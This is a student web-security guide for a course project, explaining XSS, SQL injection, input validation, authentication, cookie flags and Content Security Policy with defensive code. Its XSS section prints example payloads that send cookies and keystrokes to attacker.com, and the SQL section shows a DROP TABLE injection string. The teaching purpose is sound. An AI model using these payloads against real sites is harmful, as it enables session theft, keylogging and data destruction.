# Web Security Guide

A comprehensive guide to web application security concepts and practices for TCSS-460 students.

> **💡 Related Code**: See implementations in [`/src/core/utilities/validationUtils.ts`](../src/core/utilities/validationUtils.ts), [`/src/app.ts`](../src/app.ts), and [`/src/core/middleware/`](../src/core/middleware/)

## Quick Navigation
- 🛡️ **Input Validation**: [`validationUtils.ts`](../src/core/utilities/validationUtils.ts) - Email, phone, and role validation functions
- 🔒 **CORS Configuration**: [`app.ts`](../src/app.ts) - Cross-origin security setup
- 📝 **Validation Middleware**: [`validation.ts`](../src/core/middleware/validation.ts) - Input validation security
- 🔧 **Database Security**: [`database.ts`](../src/core/utilities/database.ts) - Parameterized queries for SQL injection prevention
- 🏗️ **Validation**: [Validation Strategies](./validation-strategies.md#security-considerations) - Security-focused validation
- 🚀 **Environment**: [Environment Configuration](./environment-configuration.md#security-best-practices) - Secure configuration management

## Table of Contents

- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [SQL Injection](#sql-injection)
- [Input Validation](#input-validation)
- [Authentication vs Authorization](#authentication-vs-authorization)
- [Secure Cookie Practices](#secure-cookie-practices)
- [Content Security Policy (CSP)](#content-security-policy-csp)

---

## Cross-Site Scripting (XSS)

### What is XSS?

Cross-Site Scripting (XSS) attacks occur when malicious scripts are injected into trusted websites. Attackers exploit insufficient input validation to execute JavaScript in victim browsers.

### How XSS Attacks Work

1. **Attacker finds input field** that displays user data (comments, profiles, search)
2. **Attacker submits malicious JavaScript code** as input
3. **Application stores the malicious code** without proper sanitization
4. **When other users view the page**, the malicious script executes in their browser
5. **Script can steal cookies**, session tokens, redirect users, or modify page content

### Types of XSS Attacks

#### **STORED XSS (Most Dangerous)**
- Malicious script is permanently stored on the server (database, file system)
- Every user who views the affected page is attacked
- **Example**: Malicious comment that steals cookies from all future readers

#### **REFLECTED XSS**
- Malicious script is reflected off the server (URL parameters, form submissions)
- Only affects users who click a specially crafted malicious link
- **Example**: Search page that displays unsanitized search terms

#### **DOM-BASED XSS**
- Attack occurs entirely in the browser via client-side JavaScript
- Server is not involved in the vulnerability
- **Example**: JavaScript that uses `location.hash` without sanitization

### XSS Attack Examples

#### Simple Script Injection
```html
<script>alert('XSS Attack!');</script>
```

#### Cookie Theft
```html
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

#### Session Hijacking
```html
<script>
new Image().src='http://attacker.com/log.php?sessionid='+document.cookie;
</script>
```

#### Keylogger
```html
<script>
document.onkeypress = function(e) {
  // Send keystrokes to attacker server
  fetch('http://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify({key: e.key})
  });
};
</script>
```

### XSS Prevention Strategies

#### **1. INPUT VALIDATION**
- Validate all user input on the server side
- Reject input containing script tags, JavaScript events, etc.
- Use allowlists instead of blocklists when possible

```typescript
// Examples from TCSS-460-auth-squared validation
export const isValidEmail = (email: string): boolean => {
    const parts = email.split('@');
    if (parts.length !== 2) return false;

    const [local, domain] = parts;
    if (!local || local.length === 0 || local.length > 64) return false;
    if (!domain || !domain.includes('.')) return false;
    return !email.includes(' ');
};

export const validateRegister = [
    body('email')
        .trim()
        .notEmpty().withMessage('Email is required')
        .isEmail().withMessage('Invalid email format')
        .normalizeEmail(),
    body('username')
        .trim()
        .isLength({ min: 3, max: 50 })
        .matches(/^[a-zA-Z0-9_-]+$/)
        .withMessage('Username can only contain letters, numbers, underscores, and hyphens'),
    body('password')
        .notEmpty()
        .isLength({ min: 8, max: 128 })
        .withMessage('Password must be between 8 and 128 characters'),
    handleValidationErrors
];
```

#### **2. OUTPUT ENCODING/ESCAPING**
- Encode special characters when displaying user content
- Convert `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`, etc.
- Use context-appropriate encoding (HTML, JavaScript, CSS, URL)

#### **3. CONTENT SECURITY POLICY (CSP)**
- HTTP header that restricts resource loading and script execution
- Prevents inline scripts and unauthorized external resources
- **Example**: `Content-Security-Policy: script-src 'self'`

#### **4. HTTP-ONLY COOKIES**
- Mark cookies as HttpOnly to prevent JavaScript access
- Reduces impact of XSS attacks on session hijacking

```javascript
// Secure cookie setting
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
```

#### **5. SECURE FRAMEWORKS**
- Use frameworks that automatically escape output (React, Angular)
- Avoid `innerHTML`, use `textContent` or framework-safe methods

### Real-World Impact

- **Account takeover and identity theft**
- **Unauthorized actions performed on behalf of users**
- **Theft of sensitive personal and financial information**
- **Defacement of websites and reputation damage**
- **Malware distribution and phishing attacks**

---

## SQL Injection

### What is SQL Injection?

SQL injection occurs when an attacker inserts malicious SQL code into application queries, potentially gaining unauthorized access to database information.

### How SQL Injection Works

```sql
-- Vulnerable query (from TCSS-460-auth-squared context)
SELECT * FROM Account WHERE Email = '" + userEmail + "'

-- Malicious input: admin@example.com'; DROP TABLE Account; --
-- Resulting query:
SELECT * FROM Account WHERE Email = 'admin@example.com'; DROP TABLE Account; --'
```

### Prevention: Parameterized Queries

```typescript
// VULNERABLE - Never do this (TCSS-460-auth-squared example)
const query = `SELECT * FROM Account WHERE Email = '${email}'`;

// SECURE - Always use parameterized queries (from TCSS-460-auth-squared)
const query = `
    SELECT a.*, ac.Salted_Hash, ac.Salt
    FROM Account a
    LEFT JOIN Account_Credential ac ON a.Account_ID = ac.Account_ID
    WHERE a.Email = $1
`;
const result = await pool.query(query, [email]);
```

---

## Input Validation

### Validation vs Sanitization

**VALIDATION**: Check if input meets requirements (reject invalid input)
**SANITIZATION**: Clean input to remove harmful content (accept and modify)

**Rule**: Always validate first, then sanitize accepted input.

### Common Validation Types

1. **TYPE VALIDATION**: Is it a string, number, boolean?
2. **FORMAT VALIDATION**: Does it match expected pattern (email, phone)?
3. **RANGE VALIDATION**: Is the value within acceptable limits?
4. **BUSINESS RULE VALIDATION**: Does it meet domain-specific requirements?

### Client-Side vs Server-Side Validation

#### **CLIENT-SIDE (Browser)**
✅ Immediate feedback to users
✅ Better user experience
❌ Can be bypassed or disabled
❌ Not secure on its own

#### **SERVER-SIDE (Your API)**
✅ Secure and cannot be bypassed
✅ Authoritative validation
✅ Protects your database and business logic
❌ Slower feedback to users

**RULE**: Always validate on the server, optionally add client-side for UX.

---

## Authentication vs Authorization

> **📖 Related Guides**:
> - [Password Security Guide](./password-security-guide.md) - Detailed password hashing and salt generation
> - [JWT Implementation Guide](./jwt-implementation-guide.md) - Secure token-based authentication

### Authentication
**"Who are you?"** - Verifying user identity

```typescript
// Login endpoint
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await verifyCredentials(username, password);
  if (user) {
    const token = generateJWT(user);
    res.json({ token });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

### Authorization
**"What can you do?"** - Verifying user permissions

> **📖 Related Guide**: See the [RBAC Guide](./rbac-guide.md) for detailed role-based access control implementation.

```typescript
// Protected endpoint
app.get('/admin', authenticateToken, authorizeAdmin, (req, res) => {
  // Only authenticated admin users reach here
  res.json({ adminData: 'sensitive information' });
});
```

---

## Secure Cookie Practices

### Essential Cookie Security Attributes

```javascript
res.cookie('sessionId', sessionId, {
  httpOnly: true,    // Prevents JavaScript access
  secure: true,      // HTTPS only
  sameSite: 'strict', // CSRF protection
  maxAge: 3600000,   // 1 hour expiration
  path: '/'          // Cookie scope
});
```

### Cookie Attributes Explained

- **HttpOnly**: Prevents XSS from accessing cookies
- **Secure**: Only sends cookies over HTTPS
- **SameSite**: Protects against CSRF attacks
- **MaxAge/Expires**: Limits cookie lifetime
- **Path/Domain**: Controls where cookies are sent

---

## Content Security Policy (CSP)

### What is CSP?

CSP is an HTTP header that helps prevent XSS attacks by controlling which resources can be loaded and executed.

### Basic CSP Example

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
```

### CSP Directives

- **default-src**: Default policy for all resource types
- **script-src**: Controls JavaScript sources
- **style-src**: Controls CSS sources
- **img-src**: Controls image sources
- **connect-src**: Controls XMLHttpRequest/WebSocket connections

### Implementation in Express

```typescript
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
  );
  next();
});
```

---

## Security Checklist for Web Applications

### ✅ Input Security
- [ ] All user input validated on server side
- [ ] Parameterized queries used for database operations
- [ ] Input sanitized before storage/display
- [ ] File upload restrictions implemented

### ✅ Authentication & Sessions
- [ ] Strong password requirements enforced
- [ ] Session management implemented securely
- [ ] Login attempts rate-limited
- [ ] Secure logout functionality

### ✅ Data Protection
- [ ] HTTPS enforced in production
- [ ] Sensitive data encrypted at rest
- [ ] Database credentials secured
- [ ] API keys and secrets properly managed

### ✅ Headers & Policies
- [ ] Security headers implemented (CSP, HSTS, etc.)
- [ ] CORS configured appropriately
- [ ] Error messages don't leak sensitive information
- [ ] Dependency vulnerabilities regularly scanned

---

## Further Reading

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Most critical web security risks
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security) - Comprehensive security guide
- [Node.js Security Checklist](https://blog.risingstack.com/node-js-security-checklist/) - Node-specific security practices

---

*This guide provides foundational security knowledge for web developers. Always stay updated with the latest security practices and vulnerabilities.*
